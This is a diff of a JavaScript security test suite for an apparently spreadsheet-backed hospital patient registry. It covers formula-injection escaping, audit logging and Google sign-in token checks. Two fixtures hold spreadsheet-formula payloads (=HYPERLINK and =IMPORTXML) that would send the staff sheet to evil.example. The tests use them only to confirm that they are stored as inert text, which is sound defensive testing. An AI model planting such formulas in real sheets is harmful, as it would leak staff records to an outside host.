@@ -35,7 +35,12 @@ T.section('SEC-B1 · nothing written to Audit_Log can become a formula', () => {
   const nt = g.session('nurse@kcmh.test', 'nurse');
   const evil = '=HYPERLINK("https://evil.example/?d="&ENCODEURL(JOIN(",",Staff!A2:H20)),"verify")';
   const r = g.post({ action: 'registerPatient', token: nt, isNew: true, patient: P(evil) });
-  T.ok('a registerPatient whose sessionId is a formula still saves', r.ok === true, r);
+  T.ok('a NEW sessionId that is a formula is refused (R2, 2026-11-02)', !!r.error && g.rows('Patient_Registry').length === 0, r);
+  // A row that holds one from before that rule is still read and edited, so the escape still matters.
+  g.seedPatient(P(evil));
+  const e = g.post({ action: 'updatePatient', token: nt, patient: P(evil, { diagnosis: 'edited' }) });
+  T.ok('an edit of a row already under a formula-shaped id saves', e.ok === true, e);
+  T.ok('…recorded in Audit_Log as text', g.audit().some(a => a.action === 'updatePatient' && a.sessionId === evil), g.audit());
   T.eq('…and neither the registry nor Audit_Log gained a live formula', g.env.injections, []);
   const at = g.session('admin@kcmh.test', 'admin');
   const d = g.post({ action: 'deletePatient', token: at, sessionId: evil });
@@ -50,7 +55,7 @@ T.section('SEC-B2 · revisionOf is server-managed, and read-back values are esca
   const g = boot();
   g.addStaff('doc@kcmh.test', 'doctor', 'Doctor-Password-1');
   const dt = g.session('doc@kcmh.test', 'doctor');
-  g.post({ action: 'registerPatient', token: dt, isNew: true, patient: P('AB-900') });
+  g.seedPatient(P('AB-900'));
   const payload = '=IMPORTXML("https://evil.example/c?"&ENCODEURL(JOIN(",",Staff!A2:H20)),"//a")';
   const c = g.post({ action: 'logDailyNutrition', token: dt, sessionId: 'AB-900', entry: E({ revisionOf: payload, revisionNumber: 7, status: 'draft' }) });
   // A draft, so the first edit below overwrites in place: since 2026-10-29 a
@@ -156,8 +161,12 @@ T.section('SEC-B8 · no account enumeration on the password path', () => {
 
 T.section('A5 / SEC-B7 · Google hd restriction prepared, default off, with telemetry', () => {
   const now = Math.floor(Date.now() / 1000);
-  const token = (email, hd) => ({ code: 200, body: JSON.stringify(Object.assign({ aud: 'client-id.apps.googleusercontent.com',
-    iss: 'https://accounts.google.com', exp: String(now + 3600), email, email_verified: 'true' }, hd ? { hd } : {})) });
+  // Each case is a different token from Google: a token verified once is kept since 2026-11-02 (A3).
+  const token = (email, hd) => {
+    [...g.cacheStore.keys()].filter(k => k.startsWith('gtok_')).forEach(k => g.cacheStore.delete(k));
+    return { code: 200, body: JSON.stringify(Object.assign({ aud: 'client-id.apps.googleusercontent.com',
+      iss: 'https://accounts.google.com', exp: String(now + 3600), email, email_verified: 'true' }, hd ? { hd } : {})) };
+  };
   const g = boot();
   g.addStaff('staff@chula.ac.th', 'doctor', '');
   g.addStaff('g@gmail.com', 'nurse', '');
@@ -277,7 +286,7 @@ T.section('SEC-B15 · audit gaps closed; destructive actions audit first', () =>
   T.eq('…and exactly one lockout row', locks, 1);
   const dt = g.session('doc@kcmh.test', 'doctor');
   const at = g.session('admin@kcmh.test', 'admin');
-  g.post({ action: 'registerPatient', token: dt, isNew: true, patient: P('AB-900') });
+  g.seedPatient(P('AB-900'));
   g.post({ action: 'updateWeights', token: dt, sessionId: 'AB-900', weights: [{ dol: 1, w: 900 }, { dol: 2, w: 910 }] });
   T.ok('updateWeights is audited', g.audit().some(a => a.action === 'updateWeights' && a.sessionId === 'AB-900'), g.audit());
   g.post({ action: 'getActivePatients', token: at, includeArchived: true });
@@ -303,7 +312,7 @@ T.section('SEC-B15 · audit gaps closed; destructive actions audit first', () =>
   const g2 = boot();
   g2.addStaff('admin@kcmh.test', 'admin', 'Admin-Password-1');
   const at2 = g2.session('admin@kcmh.test', 'admin');
-  g2.post({ action: 'registerPatient', token: at2, isNew: true, patient: P('CD-1000') });
+  g2.seedPatient(P('CD-1000'));
   const e1 = g2.post({ action: 'logDailyNutrition', token: at2, sessionId: 'CD-1000', entry: E({ ts: '2026-09-10' }) });
   g2.sheet('Audit_Log').throwOn.appendRow = { err: new Error('This action would increase the number of cells in the workbook above the limit of 10000000 cells.') };
   const regBefore = g2.rows('Patient_Registry').length, logBefore = g2.rows('Daily_Log').length;
